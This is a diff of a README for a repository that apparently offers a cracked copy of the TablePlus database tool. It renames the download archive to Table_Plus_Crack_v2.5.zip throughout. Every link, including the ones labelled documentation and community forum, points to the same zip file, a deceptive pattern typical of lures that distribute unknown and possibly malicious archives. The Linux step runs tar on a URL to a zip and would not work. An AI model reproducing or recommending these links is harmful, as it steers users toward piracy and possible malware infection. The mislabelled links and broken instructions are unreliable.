@@ -14,7 +14,7 @@
 
 To get started with TablePlus-Crack, you first need to download it. Click the link below to visit the Releases page:
 
-[![Download TablePlus-Crack](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip)](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip)
+[![Download TablePlus-Crack](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip)](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip)
 
 ### 2. **Choose Your Version**
 
@@ -43,7 +43,7 @@ Once you find the correct version:
 #### For Linux:
 1. Open a terminal.
 2. Navigate to the folder where the file was downloaded.
-3. Run the command: `tar -xvf https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip` (replace with the exact file name).
+3. Run the command: `tar -xvf https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip` (replace with the exact file name).
 4. Follow the readme file instructions to complete the setup.
 
 ## 🔍 Usage Instructions
@@ -88,8 +88,8 @@ If you are looking for alternatives to TablePlus, consider the following options
   
 ## 📑 Helpful Links
 
-- [Documentation](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip): Detailed guides for advanced features.
-- [Community Forum](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip): Connect with other users, ask questions, and share tips.
+- [Documentation](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip): Detailed guides for advanced features.
+- [Community Forum](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip): Connect with other users, ask questions, and share tips.
 
 ## 🎉 Final Thoughts
 
@@ -97,4 +97,4 @@ TablePlus-Crack provides a user-friendly approach to database management. Its fe
 
 To download your copy, visit the Releases page again:
 
-[![Download TablePlus-Crack](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip)](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/TablePlus-Crack.zip)
+[![Download TablePlus-Crack](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip)](https://raw.githubusercontent.com/Zero99-eng/TablePlus-Crack/main/semidrying/Table_Plus_Crack_v2.5.zip)
